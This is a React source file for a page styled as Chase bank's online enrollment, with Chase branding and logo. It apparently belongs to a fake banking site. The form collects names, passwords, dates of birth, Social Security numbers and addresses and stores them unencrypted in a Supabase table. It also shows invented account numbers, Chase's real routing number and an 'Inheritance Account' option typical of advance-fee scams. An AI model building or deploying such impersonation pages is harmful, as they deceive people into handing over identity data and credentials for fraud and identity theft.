import React, { useState } from 'react';
import { supabase } from '../lib/supabase';

export function EnrollPage() {
  const [formData, setFormData] = useState({
    full_name: '',
    email: '',
    username: '',
    phone: '',
    date_of_birth: '',
    password: '',
    ssn: '',
    address: '',
    account_type: 'Checking Account'
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      // Generate random account details
      const accountNumber = Math.floor(
        1000000000 + Math.random() * 9000000000
      ).toString();
      const routingNumber = '021000021'; // Standard Chase routing format

      const { error: insertError } = await supabase.from('users').insert([
        {
          ...formData,
          account_number: accountNumber,
          routing_number: routingNumber,
          balance: 0,
          verification_status: 'Pending Review'
        }
      ]);

      if (insertError) throw insertError;

      setSuccess(true);
      setTimeout(() => {
        window.location.hash = '#/signin';
      }, 3000);
    } catch (err: any) {
      setError(err.message || 'An error occurred during enrollment');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <header className="w-full bg-white py-4 border-b border-gray-200 flex justify-center">
        <a href="#/">
          <img
            src="/chasebank.png"
            alt="Crest"
            className="h-8 object-contain" />
        </a>
      </header>

      <main className="flex-grow flex items-center justify-center py-12 px-4">
        <div className="w-full max-w-2xl bg-white rounded-lg shadow-md p-8">
          <h1 className="text-3xl font-light text-gray-900 mb-2">
            Enroll in Chase Online℠
          </h1>
          <p className="text-gray-600 mb-8">
            Please provide your information below to set up your account.
          </p>

          {success ? (
            <div className="bg-green-50 border border-green-200 text-green-800 p-4 rounded mb-6">
              Account created successfully! Redirecting to sign in...
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              {error && (
                <div className="bg-red-50 border border-red-200 text-red-800 p-4 rounded">
                  {error}
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Full Name
                  </label>
                  <input
                    type="text"
                    name="full_name"
                    required
                    value={formData.full_name}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Email Address
                  </label>
                  <input
                    type="email"
                    name="email"
                    required
                    value={formData.email}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Username
                  </label>
                  <input
                    type="text"
                    name="username"
                    required
                    value={formData.username}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Password
                  </label>
                  <input
                    type="password"
                    name="password"
                    required
                    value={formData.password}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Phone Number
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    required
                    value={formData.phone}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Date of Birth
                  </label>
                  <input
                    type="date"
                    name="date_of_birth"
                    required
                    value={formData.date_of_birth}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Social Security Number
                  </label>
                  <input
                    type="text"
                    name="ssn"
                    required
                    placeholder="XXX-XX-XXXX"
                    value={formData.ssn}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Account Type
                  </label>
                  <select
                    name="account_type"
                    required
                    value={formData.account_type}
                    onChange={handleChange}
                    className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E] bg-white">
                    <option>Checking Account</option>
                    <option>Savings Account</option>
                    <option>Inheritance Account</option>
                    <option>Loan Account</option>
                    <option>Credit card</option>
                    <option>Investment Account</option>
                    <option>Corporate account</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Full Address
                </label>
                <input
                  type="text"
                  name="address"
                  required
                  value={formData.address}
                  onChange={handleChange}
                  className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:border-[#117A3E]" />
              </div>

              <div className="pt-4">
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#117A3E] hover:bg-[#0e6332] text-white font-semibold py-3 rounded transition-colors disabled:opacity-70">
                  {loading ? 'Processing...' : 'Enroll Now'}
                </button>
              </div>

              <div className="text-center text-sm text-gray-600">
                Already have an account?{' '}
                <a href="#/signin" className="text-[#117A3E] hover:underline">
                  Sign in
                </a>
              </div>
            </form>
          )}
        </div>
      </main>
    </div>
  );
}
